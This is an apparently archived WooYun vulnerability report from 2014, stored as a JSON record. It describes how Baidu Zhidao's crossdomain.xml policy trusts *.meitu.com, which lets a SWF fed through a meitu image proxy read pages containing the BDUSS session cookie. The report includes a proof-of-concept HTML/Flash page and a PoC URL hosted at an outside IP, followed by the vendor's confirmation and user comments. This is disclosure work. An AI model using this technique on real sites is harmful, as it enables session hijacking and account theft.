{"id": 982, "wybug_id": "wooyun-2014-072951", "wybug_title": "我是如何窃取到百度受http-only保护的cookie的(3)(附简单POC)", "wybug_corp": "百度", "wybug_author": "超威蓝猫", "wybug_date": "2014-08-18 19:50", "wybug_open_date": "2014-10-02 19:52", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["恶意代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向公众公开  简要描述： 前情回顾:(1)测试后台对外 http://wooyun.org/bugs/wooyun-2014-072520 (2)OAuth接口处理不当 http://wooyun.org/bugs/wooyun-2010-051705(3)合作伙伴惹的祸.. 详细说明：  看到百度WEB前端研发部15号发的一篇文章 http://fex.baidu.com/blog/2014/08/sensitive-data-sniffer/ 里面提到了几处BDUSS输出在源码中的点 三天之后看了看 zhidao.baidu.com 这处居然还没有修复，真的这么自信同域下不会产XSS吗.. (好吧我确实没有挖掘到zhidao.baidu.com下的XSS我们来看看 http://zhidao.baidu.com/crossdomain.xml\n\n天辣！居然有 *.meitu.com ，不禁让我想起了m神发过的 http://wooyun.org/bugs/wooyun-2014-062461 这意味着 我们只要能在 *.meitu.com 下找到一处能返回特定内容的接口 就可以在zhidao.baidu.com域下执行恶意代码这并不是一件难事http://xiuxiu.web.meitu.com/decorate/doodle/?utm_source=xiuxiuweb&utm_medium=banner&utm_campaign=doodle\n\n\n\n\n\n得到接口: http://xiuxiu.web.meitu.com/plat/pic_proxy.php?url=SWF文件地址于是参考 http://wooyun.org/bugs/wooyun-2014-062461 构造一个html和swfhtml源码如下:\n<html><head><title>csrftest</title><script>function sendToJavaScript(strData){    var theDiv = document.getElementById(\"HijackedData\");    var content = document.createTextNode(strData);    theDiv.appendChild(content);    theDiv.innerHTML += '<br/>'    //alert(strData);}</script></head><body><div id=HijackedData></div><object id=\"myObject\" width=\"100\" height=\"100\" allowscriptaccess=\"always\" type=\"application/x-shockwave-flash\" data=\"http://xiuxiu.web.meitu.com/plat/pic_proxy.php?url=http://162.211.226.60/test/test.jpg\"><param name=\"AllowScriptAccess\" value=\"always\"><param name=\"flashvars\" value=\"input=http://zhidao.baidu.com\"></object></body></html>\n简单POC: http://162.211.226.60/test/哈哈, BDUSS又测漏了吧\n\n   漏洞证明：  如上危害不仅仅是读源码这么简单哦，参考: 《腾讯某分站可上传任意swf文件导致的一系列问题（附简单POC）》http://wooyun.org/bugs/wooyun-2014-062461 《上传文件的陷阱》http://drops.wooyun.org/tips/2031《上传文件的陷阱II 纯数字字母的swf是漏洞么?》http://drops.wooyun.org/tips/2554   修复方案：  求礼物 :S   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-08-19 19:11 厂商回复： 感谢提交，我们立即联系业务部门处理此问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-18 19:52 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  这就是你的大新闻？    \n     2014-08-18 19:59 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  小气涛吃大便    \n     2014-08-18 20:01 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  @魇 辣鸡晖持积极    \n     2014-08-19 10:07 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  @魇\t[yǎn]  梦中惊叫，或觉得有什么东西压住不能动弹：梦～。～住了。迷惑：“被妖术～住，不能行走，心上明白……”    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}